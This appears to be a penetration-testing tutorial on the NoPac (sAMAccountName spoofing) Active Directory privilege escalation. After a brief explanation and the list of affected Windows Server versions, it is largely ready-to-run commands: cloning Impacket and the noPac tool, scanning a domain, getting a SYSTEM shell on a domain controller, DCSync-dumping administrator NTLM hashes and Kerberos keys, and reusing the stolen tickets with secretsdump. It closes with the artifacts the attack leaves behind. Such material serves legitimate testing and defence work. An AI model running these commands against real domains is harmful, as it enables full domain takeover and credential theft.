**NoPac**, also known as **SamAccountName Spoofing**, is an Active Directory privilege escalation technique disclosed in late 2021.

It combines two vulnerabilities:

| CVE            | Component                      | Description                                      |
| -------------- | ------------------------------ | ------------------------------------------------ |
| CVE‑2021‑42278 | SAM (Security Account Manager) | Allows improper modification of `sAMAccountName` |
| CVE‑2021‑42287 | Kerberos PAC                   | Kerberos ticket confusion during name resolution |

When chained together, a **standard domain user** can escalate privileges to **Domain Admin / SYSTEM on a Domain Controller**.

---

## Core Concept

Active Directory identifies computers using:

```
sAMAccountName
```

Kerberos later relies on this name when issuing tickets.

The attack abuses:

1. Ability to create computer accounts
    
2. Ability to rename computer accounts
    
3. Kerberos fallback name resolution
    

Kerberos may issue tickets for the **wrong identity** when names collide.

**Why the Attack Works**

By default:

```
Authenticated users can add up to 10 computers to the domain.
```

This is controlled by:

```
ms-DS-MachineAccountQuota
```

Default value:

```
10
```

Attack flow:

1. Create a new machine account.
    
2. Rename it to match a Domain Controller name.
    
3. Request Kerberos tickets.
    
4. Kerberos confuses identities.
    
5. Tickets are issued with DC privileges.
    

---

## Affected Versions

Vulnerable systems include:

- Windows Server 2008 R2
    
- Windows Server 2012 / 2012 R2
    
- Windows Server 2016
    
- Windows Server 2019
    
- Early Windows Server 2022 builds (before patches)
    


---

## Checking Possibility of Exploitation

**Check Domain Controller OS Version**

```powershell
Get-ADComputer -Filter * -Property OperatingSystem |
Select Name,OperatingSystem
```

**Check Machine Account Quota**

PowerView:

```powershell
Get-DomainObject -Identity "DC=domain,DC=local" -Properties ms-DS-MachineAccountQuota
```

Native PowerShell:

```powershell
Get-ADDomain | Select-Object MachineAccountQuota
```

If value = 0 → attack normally fails.

---

## Requirements

Attacker needs:

- Valid domain user credentials
    
- Network access to Domain Controller
    
- LDAP + Kerberos reachable
    
- MachineAccountQuota > 0
    

---

## Tooling

NoPac relies heavily on **Impacket**.

**Install Impacket**

```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
python3 setup.py install
```


**Clone NoPac**

```bash
git clone https://github.com/Ridter/noPac.git
cd noPac
```

---

## Vulnerability Scanning

Test if the domain is vulnerable.

```bash
sudo python3 scanner.py domain.local/user:Password \
-dc-ip <DC_IP> -use-ldap
```

Expected indicators:

```
Current ms-DS-MachineAccountQuota = 10
Got TGT with PAC
```

Successful TGT retrieval suggests vulnerability.

---

## Exploitation — SYSTEM Shell

Impersonate Administrator and obtain shell:

```bash
sudo python3 noPac.py domain.local/user:Password \
-dc-ip <DC_IP> \
-dc-host <DC_HOSTNAME> \
--impersonate administrator \
-use-ldap \
-shell
```

Result:

```
semi-interactive smbexec shell
C:\Windows\system32>
```

Notes:

- Shell uses smbexec technique
    
- Full paths required (cd navigation limited)
    

---

## Ticket Artifacts

The exploit saves Kerberos tickets locally:

```
*.ccache
```

Example:

```bash
ls
administrator.ccache
```

These tickets can be reused for Pass‑the‑Ticket attacks.

---

## Performing DCSync via NoPac

Dump domain credentials directly:

```bash
sudo python3 noPac.py domain.local/user:Password \
-dc-ip <DC_IP> \
-dc-host <DC_HOSTNAME> \
--impersonate administrator \
-use-ldap \
-dump \
-just-dc-user domain/administrator
```

Output includes:

- NTLM hashes
    
- AES Kerberos keys
    
- Domain secrets
    

---

## Post‑Exploitation Usage

Use obtained tickets:

```bash
export KRB5CCNAME=administrator.ccache
```

Example follow‑up:

```bash
secretsdump.py -k -no-pass domain.local/administrator@DC01
```


---

## Post-Exploitation Cleanup
NoPac **does not fully return the environment to its original state**.  
Some elements are reverted automatically, but **detectable traces remain**.

### Automatically Restored by the Exploit

- The temporary computer account **sAMAccountName** is renamed back to its original value.
- Kerberos impersonation session ends.
- Temporary DC name spoofing stops working.


### Artifacts That Usually Remain

#### 1. Active Directory Objects

- The **machine account created during the attack** (`WIN-XXXX$`) may still exist.
    
- Creation timestamps and attribute changes remain in AD metadata.
    

#### 2. Kerberos Artifacts

- `.ccache` tickets stored on the attacker machine.
    
- Issued TGT/TGS tickets recorded in DC logs.
    
